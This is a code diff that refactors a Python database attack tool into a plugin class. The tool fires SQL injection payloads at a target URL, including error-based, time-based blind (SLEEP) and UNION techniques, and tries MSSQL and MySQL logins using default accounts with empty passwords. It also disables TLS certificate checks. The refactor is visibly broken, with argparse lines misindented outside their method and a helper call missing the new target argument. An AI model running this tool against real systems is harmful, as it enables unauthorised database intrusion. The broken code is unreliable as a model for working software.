@@ -7,18 +7,22 @@ import sys
 import time
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor
+from input_validator import InputValidator
+from credential_manager import CredentialManager
+from base_tool import BaseTool
 
-class DatabaseAttacks:
-    def __init__(self, target, timeout=10):
-        self.target = target
-        self.timeout = timeout
+class DatabaseAttacks(BaseTool):
+    def __init__(self):
+        super().__init__('db_attacks', 'Database Attack Tool')
+        self.validator = InputValidator()
+        self.cred_manager = CredentialManager()
         self.session = requests.Session()
         self.session.verify = False
         requests.packages.urllib3.disable_warnings()
 
-    def test_sql_injection(self, parameter="id", payloads=None):
+    def test_sql_injection(self, target, parameter="id", timeout=10, payloads=None):
         """Test for SQL injection vulnerabilities"""
-        print(f"[*] Testing SQL injection on {self.target}")
+        self.add_result('info', f'Testing SQL injection on {target}')
         
         if not payloads:
             payloads = [
@@ -36,8 +40,8 @@ class DatabaseAttacks:
         vulnerable = False
         for payload in payloads:
             try:
-                url = f"{self.target}?{parameter}={urllib.parse.quote(payload)}"
-                response = self.session.get(url, timeout=self.timeout)
+                url = f"{target}?{parameter}={urllib.parse.quote(payload)}"
+                response = self.session.get(url, timeout=timeout)
                 
                 # Check for SQL error messages
                 error_indicators = [
@@ -54,9 +58,11 @@ class DatabaseAttacks:
                 
                 for indicator in error_indicators:
                     if indicator.lower() in response.text.lower():
-                        print(f"[+] VULNERABLE: SQL injection detected")
-                        print(f"    Payload: {payload}")
-                        print(f"    Error: {indicator}")
+                        self.add_result('success', 'SQL injection detected', {
+                            'payload': payload,
+                            'error': indicator,
+                            'url': url
+                        })
                         vulnerable = True
                         break
                 
@@ -67,13 +73,13 @@ class DatabaseAttacks:
                 print(f"[-] SQL injection test failed: {e}")
         
         if not vulnerable:
-            print(f"[-] No SQL injection detected")
+            self.add_result('info', 'No SQL injection detected')
         
         return vulnerable
 
-    def test_blind_sql_injection(self, parameter="id"):
+    def test_blind_sql_injection(self, target, parameter="id", timeout=10):
         """Test for blind SQL injection using time delays"""
-        print(f"[*] Testing blind SQL injection on {self.target}")
+        self.add_result('info', f'Testing blind SQL injection on {target}')
         
         time_payloads = [
             "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
@@ -84,26 +90,28 @@ class DatabaseAttacks:
         
         for payload in time_payloads:
             try:
-                url = f"{self.target}?{parameter}={urllib.parse.quote(payload)}"
+                url = f"{target}?{parameter}={urllib.parse.quote(payload)}"
                 start_time = time.time()
-                response = self.session.get(url, timeout=self.timeout)
+                response = self.session.get(url, timeout=timeout)
                 end_time = time.time()
                 
                 if end_time - start_time >= 4:  # Allow some margin
-                    print(f"[+] VULNERABLE: Blind SQL injection detected")
-                    print(f"    Payload: {payload}")
-                    print(f"    Response time: {end_time - start_time:.2f} seconds")
+                    self.add_result('success', 'Blind SQL injection detected', {
+                        'payload': payload,
+                        'response_time': f'{end_time - start_time:.2f} seconds',
+                        'url': url
+                    })
                     return True
                     
             except Exception as e:
                 print(f"[-] Blind SQL injection test failed: {e}")
         
-        print(f"[-] No blind SQL injection detected")
+        self.add_result('info', 'No blind SQL injection detected')
         return False
 
-    def test_union_sql_injection(self, parameter="id"):
+    def test_union_sql_injection(self, target, parameter="id", timeout=10):
         """Test for UNION-based SQL injection"""
-        print(f"[*] Testing UNION SQL injection on {self.target}")
+        self.add_result('info', f'Testing UNION SQL injection on {target}')
         
         # First, determine number of columns
         columns = self.determine_columns(parameter)
@@ -162,9 +170,16 @@ class DatabaseAttacks:
         
         return None
 
-    def test_mssql_connection(self, host, username, password, database="master"):
+    def test_mssql_connection(self, host, username=None, password=None, database="master"):
         """Test MSSQL connection and execute commands"""
-        print(f"[*] Testing MSSQL connection to {host}")
+        # Get credentials securely
+        if not username or not password:
+            username, password = self.cred_manager.get_safe_credential('mssql')
+            if not username or not password:
+                username = username or 'sa'
+                password = password or ''
+                
+        self.add_result('info', f'Testing MSSQL connection to {host}')
         
         try:
             conn = pymssql.connect(
@@ -249,9 +264,16 @@ class DatabaseAttacks:
         
         return False
 
-    def test_mysql_connection(self, host, username, password, database="mysql"):
+    def test_mysql_connection(self, host, username=None, password=None, database="mysql"):
         """Test MySQL connection and enumerate"""
-        print(f"[*] Testing MySQL connection to {host}")
+        # Get credentials securely
+        if not username or not password:
+            username, password = self.cred_manager.get_safe_credential('mysql')
+            if not username or not password:
+                username = username or 'root'
+                password = password or ''
+                
+        self.add_result('info', f'Testing MySQL connection to {host}')
         
         try:
             conn = mysql.connector.connect(
@@ -320,9 +342,9 @@ class DatabaseAttacks:
         print(f"[-] File reading not available")
         return False
 
-def main():
-    parser = argparse.ArgumentParser(description="Database Attack Tool")
-    parser.add_argument("target", help="Target URL or IP")
+    def add_custom_args(self, parser):
+        """Add tool-specific arguments"""
+        parser.add_argument("target", help="Target URL or IP")
     parser.add_argument("--sql-inject", action="store_true", help="Test SQL injection")
     parser.add_argument("--blind-sql", action="store_true", help="Test blind SQL injection")
     parser.add_argument("--union-sql", action="store_true", help="Test UNION SQL injection")
@@ -334,29 +356,38 @@ def main():
     parser.add_argument("--all", action="store_true", help="Run all tests")
     parser.add_argument("--timeout", type=int, default=10, help="Connection timeout")
     
-    args = parser.parse_args()
+    def run(self, args):
+        """Main execution method"""
+        try:
+            if args.target.startswith(('http://', 'https://')):
+                if not self.validator.validate_url(args.target):
+                    raise ValueError(f'Invalid URL: {args.target}')
+                target = args.target
+            else:
+                target = self.validate_target(args.target)
+        except ValueError as e:
+            self.add_result('error', str(e))
+            return
     
-    attacker = DatabaseAttacks(args.target, args.timeout)
-    
-    if args.all or args.sql_inject:
-        attacker.test_sql_injection(args.parameter)
-        print()
-    
-    if args.all or args.blind_sql:
-        attacker.test_blind_sql_injection(args.parameter)
-        print()
-    
-    if args.all or args.union_sql:
-        attacker.test_union_sql_injection(args.parameter)
-        print()
-    
-    if args.mssql:
-        attacker.test_mssql_connection(args.target, args.username, args.password)
-        print()
-    
-    if args.mysql:
-        attacker.test_mysql_connection(args.target, args.username, args.password)
-        print()
+        if args.all or args.sql_inject:
+            self.test_sql_injection(target, args.parameter, args.timeout)
+            
+        if args.all or args.blind_sql:
+            self.test_blind_sql_injection(target, args.parameter, args.timeout)
+            
+        if args.all or args.union_sql:
+            self.test_union_sql_injection(target, args.parameter, args.timeout)
+            
+        if args.mssql:
+            self.test_mssql_connection(target, args.username, args.password)
+            
+        if args.mysql:
+            self.test_mysql_connection(target, args.username, args.password)
+
+def main():
+    tool = DatabaseAttacks()
+    tool.execute()
+
 
 if __name__ == "__main__":
     try:
